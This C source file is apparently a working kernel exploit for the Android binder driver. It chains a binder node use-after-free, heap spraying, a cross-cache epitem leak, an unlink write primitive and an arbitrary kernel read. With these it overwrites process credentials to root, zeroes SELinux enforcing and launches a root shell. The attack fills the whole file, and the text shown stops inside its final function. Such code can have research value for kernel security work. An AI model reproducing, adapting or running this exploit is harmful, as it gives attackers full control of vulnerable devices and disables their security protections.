#include "binder_client.h"
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/signalfd.h>
#include "binder.h"
#include "exploit.h"
#include "util.h"


// Exploit plan:
// Spray messages back and forth, to get fragmented binder allocator
//   TODO: figure out how to do this
//
// UAF on many binder nodes
//
// Then cross cache attack with epitem
//   allocate 2 epitem per fd, try to leak first one to get leak on file and second epitem
//
// UAF on binder node, reclaim with binder ref referencing another node
//   read dangling message to leak other node
//
// UAF on other node we leaked
//   reclaim with fake msg_msg which will overwrite
//   msg_msg will have linked list setup to unlink overwrite one of file inode pointers to epitem
//
// Now arbitrary read is set up
//   leak file f_ops vtable pointer from known address
//   traverse process list with arb read to find target process
//
// perform unlink setup more times
//   overwrite uid and gid to 0
//   set selinux.enforcing to 0
//
// exec shell

void command_pipe_init(CommandPipe *command_pipe) {
    int fds[2] = { 0 };
    SYSCHK(pipe(fds));

    command_pipe->send_command_pipe = fds[1];
    command_pipe->recv_command_pipe = fds[0];

    SYSCHK(pipe(fds));
    command_pipe->send_response_pipe = fds[1];
    command_pipe->recv_response_pipe = fds[0];
}

void init_shared_barrier(pthread_barrier_t *b, int count) {
    pthread_barrierattr_t attr;
    pthread_barrierattr_init(&attr);
    pthread_barrierattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_barrier_init(b, &attr, count);
}

void exploit_ctx_init(ExploitCtx *ctx) {
    memset(ctx, 0, sizeof(ExploitCtx));

    command_pipe_init(&ctx->b_pipe);
    command_pipe_init(&ctx->c_pipe);
    command_pipe_init(&ctx->d_pipe);
}

typedef enum {
    // b commands
    UAF_NODE,

    // c commands
    RECV_NODE,
    RESET_CONTEXT,
    ACQUIRE_CONTEXT,
    // for prepping binder allocator layout for cross cache
    SEND_EMPTY,
    SEND_NODE,
} CommandType;

typedef struct {
    binder_uintptr_t base_id;
    u64 node_count;
    bool use_async;
} UafNodeArgs;

typedef struct {
    CommandType command_type;
    u32 body_size;
} PipeCommandHeader;

typedef struct {
    PipeCommandHeader header;
    void *data;
} PipeCommand;

void send_pipe_command(CommandPipe *ctx, PipeCommand *command) {
    write(ctx->send_command_pipe, &command->header, sizeof(PipeCommandHeader));
    if (command->data) {
        write(ctx->send_command_pipe, command->data, command->header.body_size);
    }
}

// sends only a command type with no body
void send_pipe_command_type(CommandPipe *ctx, CommandType command_type) {
    PipeCommand command = {
        .header = {
            .command_type = command_type,
            .body_size = 0,
        },
        .data = NULL,
    };

    send_pipe_command(ctx, &command);
}

PipeCommand recv_pipe_command(CommandPipe *ctx) {
    PipeCommand out = { 0 };
    read(ctx->recv_command_pipe, &out.header, sizeof(PipeCommandHeader));

    if (out.header.body_size > 0) {
        out.data = calloc(out.header.body_size, sizeof(u8));
        read(ctx->recv_command_pipe, out.data, out.header.body_size);
    } else {
        out.data = NULL;
    }

    return out;
}

void pipe_command_drop(PipeCommand command) {
    if (command.data) {
        free(command.data);
    }
}

typedef enum {
    COMMAND_OK,
    COMMAND_ERROR,
} PipeCommandResponse;

void send_command_response(CommandPipe *ctx, PipeCommandResponse response) {
    assert(write(ctx->send_response_pipe, &response, sizeof(PipeCommandResponse)) == sizeof(PipeCommandResponse));
}

void await_response(CommandPipe *ctx) {
    PipeCommandResponse response = COMMAND_ERROR;
    read(ctx->recv_response_pipe, &response, sizeof(PipeCommandResponse));
    if (response != COMMAND_OK) {
        panic("Received error response from pipe command");
    }
}

void uaf_nodes(LocalCtx *ctx, binder_uintptr_t base_id, u64 node_count, bool use_async);
void uaf_flush_read(LocalCtx *ctx, u64 node_count);

#undef PAGE_SIZE
#define PAGE_SIZE (0x1000)

#define PROCESS_A_BINDER 20
#define PROCESS_B_BINDER 40

#define VULN_BINDER 1337

#define SEND_COOKIE 0x69696969

// creates an empty binder reply and sends it
// used to pop message off of transaction stack, so more messages can be sent
void empty_reply(int binder_fd) {
    char read_buf[128] = { 0 };
    usize read_amount = 0;

    struct binder_txn *reply_txn = binder_txn_create(0, 0, 0);
    binder_txn_dispatch(reply_txn, binder_fd, true, NULL, 0, NULL);
    binder_txn_destroy(reply_txn);

    // read transaction complete workqueu item
    binder_read(binder_fd, read_buf, sizeof(read_buf), &read_amount);
}

// sends a node with the given node number to the recepient process
void send_node(binder_client_t *binder, u32 remote_handle, binder_uintptr_t node_num, bool read_reponse) {
    struct binder_txn *txn = binder_txn_create(remote_handle, 0, TF_ONE_WAY);
    binder_txn_add_binder_object(txn, node_num, SEND_COOKIE);

    int ret = binder_txn_dispatch(txn, binder->fd, false, NULL, 0, NULL);
    if (ret < 0) {
        panic("Failed to send node to other process");
    }

    binder_txn_destroy(txn);

    // receive response for transaction (don't do anything with it)
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    if (read_reponse) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
    }
}

// receives a handle to a node
u32 recv_strong_handle(binder_client_t *binder, u64 reply_handle) {
    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("rev_strong_handle: skipping read result with no transaction");
        } else {
            break;
        }
    }

    binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);

    for (usize i = 0; i < num_offsets; i++) {
        struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
        if (object->hdr.type == BINDER_TYPE_HANDLE) {
            u32 handle = object->handle;

            binder_acquire(binder->fd, handle);
            binder_increfs(binder->fd, handle);
            binder_free_transaction_buffer(binder->fd, txn->data.ptr.buffer);

            return handle;
        }
    }

    panic("No handle found");
}

// NOTE: doesn't read reply, because this is used in uaf_nodes, where we don't want to read the reply yet
void send_multiple_nodes(binder_client_t *binder, u32 remote_handle, binder_uintptr_t base_node_num, u32 node_count) {
    struct binder_txn *txn = binder_txn_create(remote_handle, 0, 0);
    for (usize i = 0; i < node_count; i++) {
        binder_txn_add_binder_object(txn, base_node_num + i, SEND_COOKIE);
    }

    int ret = binder_txn_dispatch(txn, binder->fd, false, NULL, 0, NULL);
    if (ret < 0) {
        panic("Failed to send node to other process");
    }

    binder_txn_destroy(txn);
}

void recv_multiple_nodes(binder_client_t *binder, u32 *ref_array, u32 node_count) {
    u8 read_buf[1024] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        binder_read(binder->fd, read_buf, sizeof(read_buf), &read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("recv_multiple_nodes: skipping read result with no transaction");
        } else {
            break;
        }
    }

    binder_uintptr_t *offsets = (binder_uintptr_t *) txn->data.ptr.offsets;
    usize num_offsets = txn->offsets_size / sizeof(binder_uintptr_t);
    usize node_index = 0;

    for (usize i = 0; i < num_offsets; i++) {
        struct flat_binder_object *object = (struct flat_binder_object *) (txn->data.ptr.buffer + offsets[i]);
        if (object->hdr.type == BINDER_TYPE_HANDLE) {
            u32 handle = object->handle;

            binder_acquire(binder->fd, handle);
            binder_increfs(binder->fd, handle);

            if (node_index >= node_count) {
                panic("recv_multiple_nodes: received too many nodes");
            }
            ref_array[node_index] = handle;
            node_index += 1;
        }
    }

    if (node_index != node_count) {
        panic("recv_multiple_nodes: Did not receive enough nodes");
    }

    binder_free_transaction_buffer(binder->fd, txn->data.ptr.buffer);
    empty_reply(binder->fd);
}

void allocate_node(LocalCtx *ctx, binder_uintptr_t node_id, bool read_reponse, bool allocate_forever) {
    CommandPipe *pipe = allocate_forever ? &ctx->ctx->d_pipe : &ctx->ctx->c_pipe;
    u32 handle = allocate_forever ? ctx->d_handle : ctx->c_handle;

    send_pipe_command_type(pipe, RECV_NODE);
    send_node(&ctx->binder, handle, node_id, read_reponse);
    await_response(pipe);
}

void reset_process_c(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->c_pipe, RESET_CONTEXT);
    await_response(&ctx->ctx->c_pipe);
}

void connect_process_c(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->c_pipe, ACQUIRE_CONTEXT);
    ctx->c_handle = recv_strong_handle(&ctx->binder, -1);
    LOGD("A: received C's handle");
    await_response(&ctx->ctx->c_pipe);
}

void connect_process_d(LocalCtx *ctx) {
    send_pipe_command_type(&ctx->ctx->d_pipe, ACQUIRE_CONTEXT);
    ctx->d_handle = recv_strong_handle(&ctx->binder, -1);
    LOGD("A: received C's handle");
    await_response(&ctx->ctx->d_pipe);
}

#define NUM_SPRAY 16

// sendmsg spray adapted from CVE-2023-3609 exploit
// payload to send on socket
u8 dummy_buf[0x1000] = { 0 };

// payload sprayed to overlap with 
u8 payload[128] = { 0 };

int control_socket[2] = { 0 };
int spray_sockets[NUM_SPRAY][2] = { 0 };


void *spray_thread(void *x) {
    size_t index = (size_t)x;
    write(control_socket[0], dummy_buf, 1);
    read(control_socket[0], dummy_buf, 1);
    pin_to_cpu(0);

    struct iovec iov = {
        .iov_base = dummy_buf,
        .iov_len = sizeof(dummy_buf),
    };

    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = payload,
        .msg_controllen = sizeof(payload),
    };

    sendmsg(spray_sockets[index][1], &msg, 0);

    return NULL;
}

void setup_spray() {
    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));

    memset(payload, 0, sizeof(payload));
    memset(dummy_buf, 0, sizeof(dummy_buf));

    struct cmsghdr *control_header = (struct cmsghdr *) &payload[0];
    control_header->cmsg_len = sizeof(payload);
    control_header->cmsg_level = 0;
    control_header->cmsg_type = 0;

    for (usize i = 0; i < NUM_SPRAY; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));

        u32 buf_size = 0x800;
        SYSCHK(setsockopt(spray_sockets[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
        SYSCHK(setsockopt(spray_sockets[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
    }

    pthread_t tid = 0;
    for (usize i = 0; i < NUM_SPRAY; i++) {
        pthread_create(&tid, 0, spray_thread, (void *)i);
        pthread_detach(tid);
    }

    // wait for threads to get setup
    int to_read = NUM_SPRAY;
    while (to_read > 0) {
        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
    }
}

void do_spray() {
    write(control_socket[1], dummy_buf, NUM_SPRAY);
    // wait for spray to finish
    // cant really use barrier cause threads will indefinately block in sendmsg
    // so they can't signal after they are done
    sleep(1);
}

// cleans up resrouces used during spray
void reset_spray() {
    for (usize i = 0; i < NUM_SPRAY; i++) {
        read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf));
        SYSCHK(close(spray_sockets[i][0]));
        SYSCHK(close(spray_sockets[i][1]));
    }

    SYSCHK(close(control_socket[0]));
    SYSCHK(close(control_socket[1]));
}

void await_thread(void *(*thread_fn)(void *value), void *value) {
    // momentarily pin to another CPU so allocations for creating new thread are serviced from different kmalloc cache
    // TODO: don't do this (preastart threads) so that exploit can still work with 1 cpu core
    pin_to_cpu(1);
    pthread_t thread = 0;
    SYSCHK(pthread_create(&thread, 0, thread_fn, value));
    SYSCHK(pthread_join(thread, NULL));
    pin_to_cpu(0);
}

void detach_thread(void *(*thread_fn)(void *value), void *value) {
    // momentarily pin to another CPU so allocations for creating new thread are serviced from different kmalloc cache
    // TODO: don't do this (preastart threads) so that exploit can still work with 1 cpu core
    pin_to_cpu(1);
    pthread_t thread = 0;
    SYSCHK(pthread_create(&thread, 0, thread_fn, value));
    SYSCHK(pthread_detach(thread));
    pin_to_cpu(0);
}

// allocates node in another thread, so inc ref count work queue item is never processed in main thread
void *allocate_node_thread(void *ctx_void) {
    pin_to_cpu(0);
    LocalCtx *ctx = (LocalCtx *) ctx_void;
    allocate_node(ctx, ctx->allocate_node_id, false, ctx->allocate_node_forever);
    return NULL;
}

typedef struct {
    int binder_fd;
    struct binder_txn *txn;
    pthread_barrier_t barrier;
} SyncTxnDispatchData;

void *sync_txn_dispatch_thread(void *sync_msg_data) {
    pin_to_cpu(0);
    SyncTxnDispatchData *data = (SyncTxnDispatchData *) sync_msg_data;

    binder_enter_looper(data->binder_fd);
    binder_txn_dispatch(data->txn, data->binder_fd, false, NULL, 0, NULL);

    pthread_barrier_wait(&data->barrier);

    pin_to_cpu(1);

    return NULL;
}

// dispatches a syncrhonous transaction on another thread, so it doesn't interfare with transaction stack
void sync_txn_dispatch(int binder_fd, struct binder_txn *txn) {
    SyncTxnDispatchData data = {
        .binder_fd = binder_fd,
        .txn = txn,
    };

    pthread_barrier_init(&data.barrier, NULL, 2);

    detach_thread(sync_txn_dispatch_thread, &data);

    pthread_barrier_wait(&data.barrier);
    pthread_barrier_destroy(&data.barrier);
}

binder_uintptr_t allocate_from_process_c(LocalCtx *ctx, CommandType command) {
    send_pipe_command_type(&ctx->ctx->c_pipe, command);

    u8 read_buf[256] = { 0 };
    usize read_amount = 0;

    struct binder_transaction_data *txn;
    for (;;) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &txn);
        if (ret < 0) {
            LOGD("allocate: skipping read result with no transaction");
        } else {
            break;
        }
    }

    empty_reply(ctx->binder.fd);

    await_response(&ctx->ctx->c_pipe);

    return txn->data.ptr.buffer;
}

binder_uintptr_t allocate_empty(LocalCtx *ctx) {
    return allocate_from_process_c(ctx, SEND_EMPTY);
}

binder_uintptr_t allocate_ref(LocalCtx *ctx) {
    return allocate_from_process_c(ctx, SEND_NODE);
}

bool looks_like_kernel_pointer(usize value) {
    return value > 0xffffff8000000000;
}

#define UAF_PTR 123456789
#define UAF_COOKIE 987654321

#define BUFFER_GAP_COUNT 5000
// The original exploit uses 1600 nodes and 28 files
// The old values didn't work for me, so I just increased them and now they work
#define SPRAY_NODE_COUNT 4096
#define FILE_COUNT 1024
#define SPRAY_EPITEM_COUNT (FILE_COUNT * 2)

#define SPRAY_BASE_ID 10000000

// number of UAF nodes that are used to leak the address of the node we will reclaim
#define UNLINK_LEAK_UAF_COUNT 1

// TODO: clean up code, currently override meaning with leak_only flag
u64 try_mem_unlink(LocalCtx *ctx, usize prev_addr, usize next_addr, bool leak_only) {
    if (!leak_only) {
        setup_spray();
    }

    u8 read_buf[4096] = { 0 };
    usize read_amount = 0;

    usize leak_addr = 0;
    binder_uintptr_t leaked_node_id = 0;
    static usize iteration = 0;
    for (;;) {
        uaf_nodes(ctx, 1337 + iteration, UNLINK_LEAK_UAF_COUNT, false);
        uaf_flush_read(ctx, UNLINK_LEAK_UAF_COUNT);

        // we need to allocate node to reclaim UAF node with ref
        // issue is if we allocate node, when we read in message pointing to freed node to get leak, we will
        // read in message acknowledging refcount incrament, which will put node in state where it can be later UAF
        // this is because this workqueue item goes per thread and the async message goes in a list
        // which is read later (so this refcount message will be read first)
        // so we spawn a new thread to do the work, and the workqueue item will go to that thread
        // and it will never read it, so it is possible to UAF this node later
        leaked_node_id = 80000 + iteration;
        ctx->allocate_node_id = leaked_node_id;
        // if we are leaking node address, node needs to stay around for a while
        ctx->allocate_node_forever = leak_only;
        await_thread(allocate_node_thread, ctx);

        bool found_leak = false;

        for (usize i = 0; i < UNLINK_LEAK_UAF_COUNT; i++) {
            LOGD("================ UNLINK UAF ================");
            binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
            LOGD("read length: %llu", read_amount);

            struct binder_transaction_data *response = NULL;
            int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
            if (ret < 0) {
                panic("Didn't receive response");
            }

            LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

            empty_reply(ctx->binder.fd);

            iteration++;

            // if target value looks like heap pointer, go next
            // cookie should also be 0, because NULL pointer is stored after in ref
            // if it is not 0, we leaked the wrong thing
            if (looks_like_kernel_pointer(response->target.ptr) && response->cookie == 0) {
                found_leak = true;
                leak_addr = response->target.ptr;
            }
        }

        if (!found_leak) {
            LOGD("retry leak...");
            // avoid allocating excesive amount of nodes
            reset_process_c(ctx);
            connect_process_c(ctx);
        } else {
            break;
        }
    }

    LOGD("================ UNLINK LEAK ================");
    LOGD("Got leak on binder node %d: %p\n\n", leaked_node_id, leak_addr);
    // FIXME: leak seems to be slightly wrong
    // trial 1
    // real value:   0xffffff8075966100
    // leaked value: 0xffffff8075968600
    // trial 2
    // real value:   0xffffff8075966100
    // leaked value: 0xffffff801d72f200

    if (leak_only) {
        return leak_addr;
    }

    // set up payload to spray
    usize list_offset = offsetof(struct binder_node, work);
    struct binder_node *node = (struct binder_node *) payload;
    // last decrament will free
    node->local_strong_refs = 1;
    node->work.entry.next = leak_addr + list_offset;
    node->dead_node.next = (struct hlist_node *) next_addr;
    node->dead_node.pprev = (struct hlist_node **) prev_addr;
    node->refs.first = NULL;
    node->proc = NULL;
    node->cookie = UAF_COOKIE;
    node->ptr = UAF_PTR;

    // now uaf the node we know its address
    // this one can't be async because buffer release needs to be a non async buffer
    uaf_nodes(ctx, leaked_node_id, 1, false);
    reset_process_c(ctx);
    LOGD("A: reset C");
    // binder frees binder proc later using linux workqueue
    // wait for the workqueue item to run to make sure it is free before
    // we read in BR_INCREF and BR_ACQUIRE codes which wil incrament local refcount
    sleep(1);
    // can't read increfs until after node dropped in process c
    uaf_flush_read(ctx, 1);

    // reclaim freed node
    do_spray();

    LOGD("================ UNLINK UAF2 ================");
    binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
    LOGD("read length: %llu", read_amount);

    struct binder_transaction_data *response = NULL;
    int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
    if (ret < 0) {
        panic("Didn't receive response");
    }

    LOGD("recv node: %llu, recv cookie: %lu, offset size: %lu", response->target.ptr, response->cookie, response->offsets_size);

    empty_reply(ctx->binder.fd);

    if (response->target.ptr == UAF_PTR && response->cookie == UAF_COOKIE) {
        sleep(1);
        // triggers unlink primtive (but maybe unreliable?)
        binder_free_transaction_buffer(ctx->binder.fd, response->data.ptr.buffer);
        // do not call reset_spray if spray is succesfull, unlink will trigger free of binder node
        // this means cleaning up spray could lead to a double free, since auxiliary data
        // buffer will also be freed. This can lead to crashes and freezes of kernel
        return 1;
    } else {
        reset_spray();
        connect_process_c(ctx);
        return 0;
    }
}

// performs the following operation in kernel memory:
// *((usize *) prev_addr) = next_addr
// *((usize *) next_addr + 8) = prev_addr
// the second write is not performed if next_addr is 0
void mem_unlink(LocalCtx *ctx, usize prev_addr, usize next_addr) {
    LOG("unlink 0x%lx <-> 0x%lx", prev_addr, next_addr);
    while (!try_mem_unlink(ctx, prev_addr, next_addr, false)) {
        LOGD("unlink failed, retrying...");
    }
    LOG("unlink done\n");
}

// performs the following operation in kernel memory:
// *((usize *) address) = 0
void zero_address(LocalCtx *ctx, usize address) {
    mem_unlink(ctx, address, 0);
}

static u32 read_u32(LocalCtx *ctx, usize address) {
    if (address != (address & ~0b11)) {
        LOG("address: 0x%lx", address);
        panic("Unaligned read");
    }

    struct epoll_event events = {
        // make events not 0 so epoll doesn't ignore
        // idt that is a thing but just in case
        .events = EPOLLIN,
        .data = { .u64 = address - SUPERBLOCK_BLOCK_SIZE_OFFSET },
    };
    SYSCHK(epoll_ctl(ctx->epoll_fd, EPOLL_CTL_MOD, ctx->leak_fd, &events));

    u32 leak_value = 0;
    if (ioctl(ctx->leak_fd, FIGETBSZ, &leak_value) < 0) {
        // if value is 0, ioctl returns error code
        return 0;
    }

    return leak_value;
}

static u64 read_u64(LocalCtx *ctx, usize address) {
    return ((u64) read_u32(ctx, address)) | (((u64) read_u32(ctx, address + 4)) << 32);
}

static void kread(LocalCtx *ctx, u64 address, u8 *buf, usize size) {
    for (usize i = 0; i < size; i += 4) {
        u32 val = read_u32(ctx, address + i);

        memcpy(buf + i, &val, MIN(size - i, sizeof(u32)));
    }
}

#define TASK_SIZE 0x1000
#define TASK_NAME "badnode"

// from badspin
int find_task_struct_offsets(LocalCtx *rw, u64 task_address) {
    prctl(PR_SET_NAME, TASK_NAME, 0, 0, 0);

    u8 task_dump[TASK_SIZE];

    kread(rw, task_address, task_dump, TASK_SIZE);

    void *comm_field = memmem(task_dump, TASK_SIZE, TASK_NAME, sizeof(TASK_NAME)-1);
    if (comm_field == NULL) {
        panic("Failed to find task_struct->comm offset");
    }

    int ts_cred_offset = (int)(comm_field- (void *)task_dump) - 16;
    rw->task_offsets.ts_cred = ts_cred_offset;

    LOG("[x] task_struct offsets:");
    LOG("\tcred          at  %d", rw->task_offsets.ts_cred);

    return 0;
}

// gets the address of the current threads task_struct
u64 get_current_task_address(LocalCtx *ctx) {
    process_a_register(ctx);
    u64 node_address = try_mem_unlink(ctx, 0, 0, true);
    LOG("node address: 0x%lx", node_address);

    struct binder_node binder_node = { 0 };
    kread(ctx, node_address, (u8 *) &binder_node, sizeof(binder_node));
    u64 proc_address = (u64) binder_node.proc;
    LOG("binder_proc: 0x%lx", proc_address);

    struct binder_proc binder_proc = { 0 };
    kread(ctx, proc_address, (u8 *) &binder_proc, sizeof(binder_proc));
    u64 task_address = (u64) binder_proc.tsk;
    LOG("task_struct: 0x%lx", task_address);
    process_a_deregister(ctx);

    return task_address;
}

void do_a(LocalCtx *ctx) {
    process_a_register(ctx);

    u8 read_buf[4096] = { 0 };
    usize read_amount = 0;

    // first arg must just be nonzero, but does nothing
    int epoll_fd = SYSCHK(epoll_create(1));

    // first we get 28 files open
    int files_to_leak[SPRAY_EPITEM_COUNT] = { 0 };
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i += 2) {
        // must dup file descriptor to allow adding multiple epitem to same struct file
        // badspin uses timerfd for epoll, use this because
        // I get permission denied for regular file and /dev/null
        files_to_leak[i] = SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
        files_to_leak[i + 1] = SYSCHK(dup(files_to_leak[i]));
    }

    LOG("Opened file descriptors...");

    // next step is arrange binder allocator to have many gaps which a received node fit in
    // TODO: figure out why this part is even needed
    // article mentions having it, but I don't really know what the purpose is
    // it seems like allocating transaction buffers from kmalloc-128 while triggering the bug is fine
    // since they will likely end up on different page, since we allocate and deallocate all the nodes + refs all at once
    // However, removing it breaks the cross cache attack
    binder_uintptr_t ref_bufs_to_free[BUFFER_GAP_COUNT] = { 0 };
    for (usize i = 0; i < BUFFER_GAP_COUNT; i++) {
        ref_bufs_to_free[i] = allocate_empty(ctx);
        allocate_empty(ctx);
    }

    LOG("Allocated from binder allocator...");

    // create the gaps
    for (usize i = 0; i < BUFFER_GAP_COUNT; i++) {
        binder_free_transaction_buffer(ctx->binder.fd, ref_bufs_to_free[i]);
    }

    LOG("Created gaps in binder allocator...");

    // now spray and uaf many nodes
    // TODO: use async transaction instead of another thread, reduce allocations
    // uaf nodes allocates all the nodes first, then frees them later, so it works how we need
    uaf_nodes(ctx, SPRAY_BASE_ID, SPRAY_NODE_COUNT, true);
    uaf_flush_read(ctx, SPRAY_NODE_COUNT);

    LOG("UAF nodes done...");

    // reclaim with epoll fds
    struct epoll_event events = {
        // make events not 0 so epoll doesn't ignore
        // idt that is a thing but just in case
        .events = EPOLLIN,
        .data = { 0 },
    };
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i++) {
        SYSCHK(epoll_ctl(epoll_fd, EPOLL_CTL_ADD, files_to_leak[i], &events));
    }

    LOG("Reclaimed with ep_item...");

    bool epitem_found = false;
    usize epitem_addr = 0;
    usize file_addr = 0;

    for (usize i = 0; i < SPRAY_NODE_COUNT; i++) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);
        struct binder_transaction_data *response = NULL;
        int ret = binder_read_buffer_lookup(read_buf, read_amount, BR_TRANSACTION, (void **) &response);
        if (ret < 0) {
            panic("Didn't receive response");
        }

        if (!epitem_found && response->cookie != SEND_COOKIE && looks_like_kernel_pointer(response->target.ptr) && looks_like_kernel_pointer(response->cookie)) {
            // memory corruption occured, potential epitem leak
            usize leak1 = response->target.ptr;
            usize leak2 = response->cookie;

            // Determine which leak is struct file and which is struct epitem
            // This can be done by looking at alignmant of pointers relative to 128 bytes (epitem size, smaller than struct file)
            // NOTE: struct file is marked with __randomize_layout, but since the layout randomization is done by a GCC kernel module,
            // and android is built with clang, I think it will not be enabled for android

            // struct epitem linked list is at offset 88 and 96
            // so a pointer to ep_item will point to offset 88 (start of struct list_node)
            // on my computer file is 192 size cache, but I think this is incorrect (check filp cache in cat /proc/slabinfo and assume same for android)

            bool leak1_is_epitem = leak1 % 128 == EP_ITEM_LIST_HEAD_OFFSET;
            bool leak2_is_epitem = leak2 % 128 == EP_ITEM_LIST_HEAD_OFFSET;
            if (leak1_is_epitem && leak2_is_epitem) {
                continue;
            } else if (leak1_is_epitem) {
                epitem_addr = leak1 - EP_ITEM_LIST_HEAD_OFFSET;
                file_addr = leak2 - FILE_LIST_HEAD_OFFSET;
            } else if (leak2_is_epitem) {
                epitem_addr = leak2 - EP_ITEM_LIST_HEAD_OFFSET;
                file_addr = leak1 - FILE_LIST_HEAD_OFFSET;
            } else {
                continue;
            }
            if (epitem_addr > 0xffffffe000000000) {
                // sometimes a large address is leaked for some reason
                // and then the corresponding file is unaligned
                // ignore these leaks which are probably some other object
                continue;
            }
            epitem_found = true;
            // still need to read rest of messages, so don't break here
        }
    }

    if (!epitem_found) {
        // TODO: if leak fails, retry cross cache attack
        panic("Could not succeed with cross cache attack");
    }

    LOG("\n================ LEAK ================");
    LOG("Leaked epitem and file");
    LOG("epitem addr: 0x%lx", epitem_addr);
    LOG("file addr: 0x%lx\n", file_addr);

    process_a_deregister(ctx);

    // corrupt file->inode to point inside of epitem
    process_a_register(ctx);
    mem_unlink(ctx, file_addr + FILE_INODE_OFFSET, epitem_addr + EP_ITEM_USER_DATA_OFFSET - 40);
    process_a_deregister(ctx);

    LOG("A: file->inode corrupted");

    // next determine file descritptor corresponding to struct file and struct epitem we leaked

    // set all arbitrary read to read user data value of leaked struct epitem
    usize update_value = epitem_addr + EP_ITEM_USER_DATA_OFFSET - SUPERBLOCK_BLOCK_SIZE_OFFSET;
    events.data.u64 = update_value;
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i++) {
        SYSCHK(epoll_ctl(epoll_fd, EPOLL_CTL_MOD, files_to_leak[i], &events));
    }

    u32 ioctl_val = 0;
    usize correct_file_index = -1;
    for (usize i = 0; i < SPRAY_EPITEM_COUNT; i += 2) {
        SYSCHK(ioctl(files_to_leak[i], FIGETBSZ, &ioctl_val));
        // check if 4 bytes read match lower 4 bytes of address we set with epoll_ctl_mod
        if (ioctl_val == (u32) (update_value & 0xffffffff)) {
            correct_file_index = i;
            break;
        }
    }

    if (correct_file_index == -1) {
        panic("Could not find file with corrupted inode pointer");
    }

    // now check which of 2 epitems for given file is correct
    // change pointer for first epitem, and check if read value changes
    // if it does, this is correct fd, if it doesn't, second epitem is correct leak
    events.data.u64 = epitem_addr - SUPERBLOCK_BLOCK_SIZE_OFFSET;
    SYSCHK(epoll_ctl(epoll_fd, EPOLL_CTL_MOD, files_to_leak[correct_file_index], &events));

    SYSCHK(ioctl(files_to_leak[correct_file_index], FIGETBSZ, &ioctl_val));
    if (ioctl_val == (u32) (update_value & 0xffffffff)) {
        ctx->leak_fd = files_to_leak[correct_file_index + 1];
    } else {
        ctx->leak_fd = files_to_leak[correct_file_index];
    }

    ctx->epoll_fd = epoll_fd;

    LOG("A: set up arbitrary read");
    u64 file_operations = read_u64(ctx, file_addr + FILE_FOPS_VTABLE_OFFSET);
    LOG("fops: 0x%lx", file_operations);

    ctx->kernel_base = file_operations - TIMERFD_FOPS_OFFSET;
    LOG("Leaked kernel base: 0x%lx", ctx->kernel_base);

    u64 task_address = get_current_task_address(ctx);

    find_task_struct_offsets(ctx, task_address);

    u8 task_buffer[0x2000] = { 0 };
    kread(ctx, task_address, task_buffer, sizeof(task_buffer));
    u64 cred_address = *(u64 *) &task_buffer[ctx->task_offsets.ts_cred];

    LOG("read out task struct");
    LOG("creds: 0x%lx", cred_address);

    // get root in current process
    process_a_register(ctx);
    // second 8 byte word corresponds to real GID and saved UID
    // then we can use setuid to make the rest root
    zero_address(ctx, cred_address + 8);
    process_a_deregister(ctx);

    SYSCHK(setresuid(0, 0, 0));
    SYSCHK(setresgid(0, 0, 0));

    // zero selinux_state.enforcing
    process_a_register(ctx);
    zero_address(ctx, ctx->kernel_base + SELINUX_STATE_OFFSET);
    process_a_deregister(ctx);

    if (SYSCHK(fork()) == 0) {
        // run shell in new process
        // if we exec in current process, spray threads will be destroyed, leading to UAF
        execlp("/bin/sh", "/bin/sh", NULL);
    }

    for (;;) {}
